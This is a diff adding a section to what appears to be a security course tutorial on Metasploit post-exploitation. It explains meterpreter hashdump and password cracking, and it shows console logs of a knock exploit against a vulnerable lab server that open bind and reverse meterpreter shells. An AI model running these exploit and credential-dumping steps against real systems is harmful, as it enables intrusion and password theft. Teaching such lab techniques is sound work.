@@ -93,6 +93,66 @@ stone to attack other computers or networks from inside.
 ## Introduction to Metasploit and Armitage
 Please check this <a href="../FieldTrips">tutorial</a> on an introduction to Metasploit and Armitage.
 
+## Post exploitation and meterpreter
+
+Once into a computer, the attacker may collects sensitive information e.g., usernames and passwords.
+How? One way is to use meterpreter, a Metasploit attack payload.
+Meterpreter provides the attacker an interactive shell exploring the target machine and executing code.
+For example, within meterpreter, *hashdump* can list all the usernames and the passwords.
+Then use John the ripper to crack password hashes.
+
+### knock module against vchat
+
+Here is what happens (armitage shows in the exploit window) when using the knock module without selecting *Use a reverse connection*
+```
+msf6 > use exploit/windows/vulnserver/knock
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/vulnserver/knock) > set RHOSTS 192.168.1.19
+RHOSTS => 192.168.1.19
+msf6 exploit(windows/vulnserver/knock) > set TARGET 0
+TARGET => 0
+msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
+LHOST => 192.168.1.4
+msf6 exploit(windows/vulnserver/knock) > set LPORT 19521
+LPORT => 19521
+- msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
+msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
+RPORT => 9999
+msf6 exploit(windows/vulnserver/knock) > exploit -j
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+[*] 192.168.1.19:9999 - Connecting to target...
+[*] 192.168.1.19:9999 - Trying target vulnserver-KNOCK...
+[*] Started bind TCP handler against 192.168.1.19:19521
+[*] Sending stage (175174 bytes) to 192.168.1.19
+[*] Meterpreter session 1 opened (192.168.1.4:38211 -> 192.168.1.19:19521 ) at 2022-06-12 16:25:01 -0400
+```
+
+Here is what happens (armitage shows in the exploit window) when using the knock module with selecting *Use a reverse connection*
+```
+use exploit/windows/vulnserver/knock
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/vulnserver/knock) > set RHOSTS 192.168.1.19
+RHOSTS => 192.168.1.19
+msf6 exploit(windows/vulnserver/knock) > set TARGET 0
+TARGET => 0
+msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
+LHOST => 192.168.1.4
+msf6 exploit(windows/vulnserver/knock) > set LPORT 13421
+LPORT => 13421
+- msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
+RPORT => 9999
+msf6 exploit(windows/vulnserver/knock) > exploit -j
+[*] Exploit running as background job 3.
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 192.168.1.4:13421 
+[*] 192.168.1.19:9999 - Connecting to target...
+[*] 192.168.1.19:9999 - Trying target vulnserver-KNOCK...
+[*] Sending stage (175174 bytes) to 192.168.1.19
+```
 
 <!---
 so you can see now once you
